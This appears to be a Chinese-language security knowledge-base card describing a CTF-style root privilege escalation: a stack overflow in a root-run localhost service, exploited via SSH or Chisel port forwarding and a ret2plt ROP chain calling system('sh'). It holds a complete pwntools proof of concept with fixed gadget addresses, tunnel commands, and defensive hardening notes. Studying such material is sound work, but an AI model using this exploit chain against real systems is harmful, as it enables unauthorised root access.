---
id: binary-pwn-stack-ret2plt-system-sh-local-root-service
title: 无 PIE/无 Canary 的 read 栈溢出：本地 root 服务经 SSH/Chisel 隧道 ret2plt system('sh')
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2plt-system-sh-local-root-service
aliases:
- ret2plt
- pop rdi; ret
- system@plt
- read 栈溢出
- 本地 root 服务
- SSH 本地端口转发
- Chisel 端口转发
- waityou
tags:
- pwn
- stack-overflow
- rop
- ret2plt
- no-pie
- no-canary
- nx
- linux
- ssh-tunnel
- chisel
- privilege-escalation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V151
  verified_at: '2026-11-06T07:40:44+08:00'
  notes: 已对照原文与图05/06核对：waityou root:yolo 750、root 进程监听 127.0.0.1:9999、vuln() buf[rbp-0x40] 与 read(0,buf,256)、offset=72、无 Canary/无PIE/NX、system@plt=0x401050、pop rdi;ret=0x401246、ret=0x401016、hints 的 sh@0x4040e0、SSH -L/Chisel 转发、root id 与 /root/root.txt 均一致。未验证点：未在本机复跑二进制；CTF 无组件版本，不设 affected_versions。原文 img05 另见 main 中 argc>99999 的 system(command) 分支，卡未展开，不影响本链。
---

## 一句话结论

一个以 root 运行、只监听 `127.0.0.1:9999` 的 TCP 服务在 `vuln()` 里把 256 字节 `read` 进 64 字节栈缓冲区，且二进制无 Canary、无 PIE、NX 开启；攻击者用 SSH 本地转发或 Chisel 把该端口映射到本地，发送 `72 字节填充 + ret 对齐 + pop rdi; ret + "sh" 地址 + system@plt` 的 ROP 链，即以 root 身份执行 `system("sh")`。

## 原理

- **漏洞点**：反编译 `vuln(int fd)` 可见
  ```c
  _BYTE buf[64];           // [rbp-0x40]
  ...
  return read(0, buf, 256u); // 读 256 字节，溢出 192 字节
  ```
  `buf` 到保存的 RBP 为 0x40=64 字节，再加 8 字节保存 RBP，覆盖返回地址的偏移为 **72**。
- **保护机制**：`checksec` 为 `Partial RELRO / No canary / NX enabled / No PIE (0x400000) / not stripped`。无 Canary 可直接覆盖返回地址；无 PIE 使代码/PLT/字符串地址固定；NX 只禁止执行栈，仍可复用可执行段中的 gadget 与 `system@plt`。
- **关键地址**（案例二进制）：
  - `system@plt = 0x401050`；
  - `pop rdi; ret = 0x401246`（把第一个参数放入 RDI）；
  - `ret = 0x401016`（栈对齐）；
  - `"sh"` 字符串地址 `0x4040e0`：源码 `char hints[] = "sh\0may be she is wait for you!!!";`，C 字符串在 `\0` 截断，所以该地址就是 `"sh"`。
- **ROP 链**：`padding(72) + ret + pop_rdi_ret + 0x4040e0 + system@plt`。额外的 `ret` 用于 16 字节栈对齐（x86-64 System V ABI：进入函数时 `RSP % 16 == 8`），否则 `system` 内的 `movaps` 可能崩溃。
- **本地 root 服务**：`waityou` 属主 root、属组 yolo、权限 750，已被 root 启动并监听 `127.0.0.1:9999`；低权限用户 yolo 能执行文件但端口只绑本地。攻击者通过 SSH 本地转发 `ssh -L 8888:127.0.0.1:9999 yolo@target` 或 Chisel `server/client` 把 9999 映射到本地 8888，再对 8888 发送 payload。服务进程本身是 root，`system("sh")` 继承 root。
- **为什么 localhost 不是边界**：攻击者已获得低权限 shell/SSH 凭据，本地端口可通过端口转发、`socat`、`bash /dev/tcp`、Python socket 等方式访问；绑定 127.0.0.1 只阻止远程直连，不阻止已落地的攻击者。

## 触发条件

- 目标 Linux 上存在以 root（或高权限）运行、监听 localhost 的 TCP 服务；
- 服务处理函数存在栈缓冲区溢出（本例 `read` 长度大于缓冲区）；
- 二进制无 Canary、无 PIE（或已泄露基址），NX 开启但可 ret2plt/ret2libc；
- 二进制中有 `system@plt`（或可泄露 libc）、`pop rdi; ret` 等 gadget 与可用的 `"sh"` 字符串；
- 攻击者已获得低权限账户/SSH 凭据，能建立端口转发。

## 利用步骤

1. 信息搜集：`rustscan`/`nmap` 发现 22 与 8080；Web 漏洞拿到 `ttt` 凭据；`sudo -l` + Python 模块劫持提到 `yolo`。
2. 在 yolo 家目录发现 root:yolo 750 的 `waityou`，`ss -tuln` 显示 `127.0.0.1:9999` 由 root 进程监听；本机无 `nc`。
3. 建隧道：`ssh -L 8888:127.0.0.1:9999 yolo@target -i key`；或用 Chisel `./chisel server -p 8000` + 本地 `./chisel client target:8000 8887:127.0.0.1:9999`。
4. `checksec` + IDA 反编译确认偏移 72、无 Canary/无 PIE；`ROPgadget`/`objdump` 找 `pop rdi; ret`、`ret`、`system@plt`、`"sh"`。
5. 构造 payload：`b"A"*72 + p64(ret) + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_plt)`。
6. 连接本地转发端口，等待 `Enter Access Code: ` 后发送 payload；`system("sh")` 返回交互 shell，`id` 为 root，读取 `/root/root.txt`。

## PoC

```python
from pwn import *

HOST, PORT = "127.0.0.1", 8888
context.arch = "amd64"
context.os = "linux"

POP_RDI_RET = 0x401246
SYSTEM_PLT  = 0x401050
SH_ADDR     = 0x4040e0
RET_GADGET  = 0x401016
OFFSET      = 72

payload = flat(
    b"A" * OFFSET,
    RET_GADGET,      # 栈对齐
    POP_RDI_RET,     # RDI = "sh"
    SH_ADDR,
    SYSTEM_PLT,      # system("sh")
)

io = remote(HOST, PORT)
io.recvuntil(b"Enter Access Code: ")
io.send(payload)
io.interactive()
```

```bash
# 隧道方式 1：SSH 本地转发
ssh -L 8888:127.0.0.1:9999 yolo@192.168.1.18 -i ezai
# 隧道方式 2：Chisel
# 靶机：./chisel server -p 8000
# 本地：./chisel client 192.168.1.18:8000 8887:127.0.0.1:9999
```

## 变体与关联

- 若开启 PIE，先泄露代码基址再计算 gadget/PLT；若开启 Canary，先泄露 canary；若没有 `system@plt`，改 ret2libc 泄露 libc 基址。
- 若二进制静态链接且内置 `system`/`/bin/sh`，参考 [[binary-pwn-rop-static-link-ret2system-sh]]，不需要 PLT。
- 若没有现成 `"sh"` 字符串，可写入 `.bss` 或用 `one_gadget`；若 `pop rdi; ret` 缺失，用 `ret2csu` 等通用 gadget。
- 关联 [[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]：无 `/bin/sh` 时先写入 `.bss` 再 ROP 的两阶段做法。
- 关联 [[pentest-privilege-escalation-python-script-dir-module-hijack]]：本机 WP 中从 ttt 到 yolo 的前置提权。
- 边界：服务不以 root 运行、二进制有 Canary/PIE 且无法泄露、或攻击者无法建立隧道/本地访问时，链断；`system("sh")` 依赖 `/bin/sh` 可执行。

## 检测与防御

- 编译加固：`-fstack-protector-strong`、`-fPIE -pie`、Full RELRO；把 `read` 长度改为 `sizeof(buf)`。
- 不要以 root 运行网络服务；使用最小权限账户、systemd sandbox、seccomp、只读文件系统与命名空间。
- 绑定 localhost 不是安全边界：限制本地低权限用户对服务的访问（Unix socket 权限、SO_PEERCRED、鉴权）。
- 检测：服务进程崩溃/核心转储、ROP 特征（返回地址指向 PLT/gadget）、异常 `system`/`execve` 调用、低权限用户建立到本地端口的转发；审计 sudo 规则与可写脚本目录。
